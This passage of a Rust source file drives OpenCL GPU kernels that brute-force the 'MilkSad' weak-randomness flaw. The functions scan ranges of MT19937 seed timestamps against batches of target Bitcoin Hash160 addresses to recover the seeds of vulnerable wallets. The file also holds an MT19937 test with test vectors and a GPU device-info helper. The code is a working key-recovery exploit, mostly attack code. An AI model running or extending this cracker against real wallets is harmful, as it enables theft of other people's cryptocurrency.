            let read_count = std::cmp::min(count, max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }

    /// Multi-target MilkSad crack — scans a timestamp range against a batch of Hash160 targets.
    ///
    /// Accepts a flat buffer of Hash160s (20 bytes each) and a matching purposes slice.
    /// Returns Vec of (timestamp, addr_index, target_index).
    pub fn compute_milk_sad_crack_multi_target(
        &self,
        start_timestamp: u32,
        end_timestamp: u32,
        flat_h160: &[u8],           // N × 20 bytes
        purposes: &[u32],           // N purposes (44 / 49 / 84)
        entropy_bits: u32,          // 128 / 192 / 256
        multipath: bool,            // check 30 addresses or just index 0
    ) -> ocl::Result<Vec<(u32, u32, u32)>> {
        let target_count = purposes.len() as u32;
        assert_eq!(flat_h160.len(), purposes.len() * 20, "flat_h160 must be N×20 bytes");

        // Choose kernel
        let kernel_name = match (entropy_bits, multipath) {
            (256, true)  => "milk_sad_mt_multi30_256",
            (256, false) => "milk_sad_mt_256",
            (192, true)  => "milk_sad_mt_multi30_192",
            (192, false) => "milk_sad_mt_192",
            (_,   true)  => "milk_sad_mt_multi30",
            (_,   false) => "milk_sad_mt",
        };

        let max_results = 8192usize;

        let buf_h160 = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(flat_h160.len())
            .copy_host_slice(flat_h160)
            .build()?;

        let buf_purposes = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(purposes.len())
            .copy_host_slice(purposes)
            .build()?;

        // results: each hit = (timestamp u32, addr_idx u32, target_idx u32) packed into u64×2
        // Encoding: results[i*2+0] = timestamp | (addr_idx << 32)
        //           results[i*2+1] = target_idx
        let buf_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_results * 2)
            .build()?;

        let buf_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;
        buf_count.write(&vec![0u32]).enq()?;

        let range = (end_timestamp - start_timestamp) as usize;
        let local  = self.max_work_group_size.min(256);
        let global = range.div_ceil(local) * local;

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buf_results)
            .arg(&buf_count)
            .arg(&buf_h160)
            .arg(&buf_purposes)
            .arg(target_count)
            .arg(start_timestamp)   // offset
            .arg(max_results as u32)
            .global_work_size(global)
            .local_work_size(local)
            .build()?;

        unsafe { kernel.cmd().global_work_size(global).local_work_size(local).enq()?; }

        let mut count_vec = vec![0u32; 1];
        buf_count.read(&mut count_vec).enq()?;
        let count = (count_vec[0] as usize).min(max_results);

        if count == 0 { return Ok(Vec::new()); }

        let mut raw = vec![0u64; max_results * 2];
        buf_results.read(&mut raw).enq()?;

        let output = (0..count).map(|i| {
            let w0 = raw[i * 2];
            let w1 = raw[i * 2 + 1];
            let timestamp  = (w0 & 0xFFFF_FFFF) as u32;
            let addr_idx   = (w0 >> 32) as u32;
            let target_idx = w1 as u32;
            (timestamp, addr_idx, target_idx)
        }).collect();

        Ok(output)
    }

    /// Multi-path MilkSad crack - checks 30 receive addresses per timestamp
    /// Returns: Vec of (timestamp, address_index)
    pub fn compute_milk_sad_crack_multipath(
        &self,
        start_timestamp: u32,
        end_timestamp: u32,
        target_h160: &[u8; 20],
        purpose: u32,
        entropy_bits: u32,  // 128, 192, or 256
    ) -> ocl::Result<Vec<(u32, u32)>> {
        let kernel_name = match entropy_bits {
            192 => "milk_sad_crack_multi30_192",
            256 => "milk_sad_crack_multi30_256",
            _   => "milk_sad_crack_multi30",   // default: 128-bit
        };

        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;

        buffer_count.write(&vec![0u32]).enq()?;

        // Parse target Hash160
        let mut h1: u64 = 0;
        let mut h2: u64 = 0;
        let mut h3: u32 = 0;

        for (i, &byte) in target_h160.iter().enumerate().take(8) {
            h1 |= (byte as u64) << (i * 8);
        }
        for (i, &byte) in target_h160.iter().skip(8).enumerate().take(8) {
            h2 |= (byte as u64) << (i * 8);
        }
        for (i, &byte) in target_h160.iter().skip(16).enumerate().take(4) {
            h3 |= (byte as u32) << (i * 8);
        }

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(h1)
            .arg(h2)
            .arg(h3)
            .arg(purpose)
            .arg(start_timestamp) // Offset - CRITICAL: must be start_timestamp, not 0
            .build()?;

        let range = (end_timestamp - start_timestamp) as usize;
        // Use device-optimized work group size
        let local_work_size = self.max_work_group_size.min(256);
        let global_work_size = range.div_ceil(local_work_size) * local_work_size;

        unsafe {
            kernel
                .cmd()
                .global_work_size(global_work_size)
                .local_work_size(local_work_size)
                .enq()?;
        }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = std::cmp::min(count, max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;

            let mut output = Vec::new();
            for &val in results.iter().take(read_count) {
                let timestamp = (val & 0xFFFFFFFF) as u32;
                let addr_idx = (val >> 32) as u32;
                output.push((timestamp, addr_idx));
            }
            Ok(output)
        } else {
            Ok(Vec::new())
        }
    }

    /// Test MT19937 implementation against known test vectors
    pub fn test_mt19937(&self, seeds: &[u32]) -> ocl::Result<Vec<[u8; 16]>> {
        let count = seeds.len();

        let buffer_seeds = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(count)
            .copy_host_slice(seeds)
            .build()?;

        let buffer_results = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(count * 16)
            .build()?;

        let local_work_size = self.calculate_local_work_size(count);

        let kernel = self
            .pro_que
            .kernel_builder("test_mt19937")
            .arg(&buffer_seeds)
            .arg(&buffer_results)
            .arg(count as u32)
            .global_work_size(count)
            .local_work_size(local_work_size)
            .build()?;

        unsafe {
            kernel.enq()?;
        }

        let mut raw_results = vec![0u8; count * 16];
        buffer_results.read(&mut raw_results).enq()?;

        let mut results = Vec::with_capacity(count);
        for chunk in raw_results.chunks(16) {
            let mut entropy = [0u8; 16];
            entropy.copy_from_slice(chunk);
            results.push(entropy);
        }

        Ok(results)
    }

    /// Get GPU device information for debugging and profiling
    pub fn device_info(&self) -> ocl::Result<String> {
        let device = self.pro_que.device();
        let name = device.name()?;
        let vendor = device.vendor()?;
        let version = device.version()?;
        let driver = match device.info(ocl::enums::DeviceInfo::DriverVersion)? {
            ocl::enums::DeviceInfoResult::DriverVersion(v) => v,
            _ => "Unknown".to_string(),
        };

        let compute_units = match device.info(ocl::enums::DeviceInfo::MaxComputeUnits)? {
            ocl::enums::DeviceInfoResult::MaxComputeUnits(units) => units,
            _ => 0,
        };

        let clock_freq = match device.info(ocl::enums::DeviceInfo::MaxClockFrequency)? {
            ocl::enums::DeviceInfoResult::MaxClockFrequency(freq) => freq,
            _ => 0,
        };

        let global_mem = match device.info(ocl::enums::DeviceInfo::GlobalMemSize)? {
            ocl::enums::DeviceInfoResult::GlobalMemSize(size) => size / (1024 * 1024),
            _ => 0,
        };

        let local_mem = match device.info(ocl::enums::DeviceInfo::LocalMemSize)? {
            ocl::enums::DeviceInfoResult::LocalMemSize(size) => size / 1024,
            _ => 0,
        };

        let max_alloc = match device.info(ocl::enums::DeviceInfo::MaxMemAllocSize)? {
            ocl::enums::DeviceInfoResult::MaxMemAllocSize(size) => size / (1024 * 1024),
            _ => 0,
        };
        Ok(format!(
            "GPU Device Information:\n\
             Name: {}\n\
             Vendor: {}\n\
             Version: {}\n\
             Driver: {}\n\
             Compute Units: {}\n\
             Clock Frequency: {} MHz\n\
             Global Memory: {} MB\n\
             Local Memory: {} KB\n\
             Max Allocation: {} MB\n\
             Max Work Group Size: {}\n\
             Preferred Multiple: {}",
            name,
            vendor,
            version,
            driver,
            compute_units,
            clock_freq,
            global_mem,
            local_mem,
            max_alloc,
            self.max_work_group_size,
            self.preferred_work_group_multiple
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_mt19937_validation() {
        // Test vectors generated from standard MT19937
        let test_cases = vec![
            (
                0u32,
                &[
                    0x8cu8, 0x7fu8, 0x0au8, 0xacu8, 0x97u8, 0xc4u8, 0xaau8, 0x2fu8, 0xb7u8, 0x16u8,
                    0xa6u8, 0x75u8, 0xd8u8, 0x21u8, 0xccu8, 0xc0u8,
                ] as &[u8],
            ),
            (
                1u32,
                &[
                    0x6au8, 0xc1u8, 0xf4u8, 0x25u8, 0xffu8, 0x47u8, 0x80u8, 0xebu8, 0xb8u8, 0x67u8,
                    0x2fu8, 0x8cu8, 0xeeu8, 0xbcu8, 0x14u8, 0x48u8,
                ] as &[u8],
            ),
            (
                1234567890u32,
                &[
                    0x9eu8, 0x69u8, 0x55u8, 0x82u8, 0x57u8, 0x2bu8, 0x97u8, 0xffu8, 0x97u8, 0x74u8,
                    0xa5u8, 0x66u8, 0x26u8, 0x26u8, 0xe4u8, 0x2fu8,
                ] as &[u8],
            ),
        ];

        // Initialize GPU solver
        let solver = match GpuSolver::new() {
            Ok(s) => s,
            Err(e) => {
                eprintln!("GPU not available for test: {}", e);
                return; // Skip test if no GPU
            }
        };

        let seeds: Vec<u32> = test_cases.iter().map(|(s, _)| *s).collect();

        match solver.test_mt19937(&seeds) {
            Ok(results) => {
                for (i, (seed, expected)) in test_cases.iter().enumerate() {
                    eprintln!("Testing seed: {}", seed);
                    eprintln!("  Expected: {:02x?}", expected);
                    eprintln!("  Got:      {:02x?}", &results[i]);
                    assert_eq!(
                        &results[i][..],
                        *expected,
                        "MT19937 mismatch for seed {}",
                        seed
                    );
                }
                eprintln!("✓ All MT19937 tests passed!");
            }
            Err(e) => {
                eprintln!("GPU test failed: {}", e);
                panic!("MT19937 GPU test failed");
            }
        }
    }
}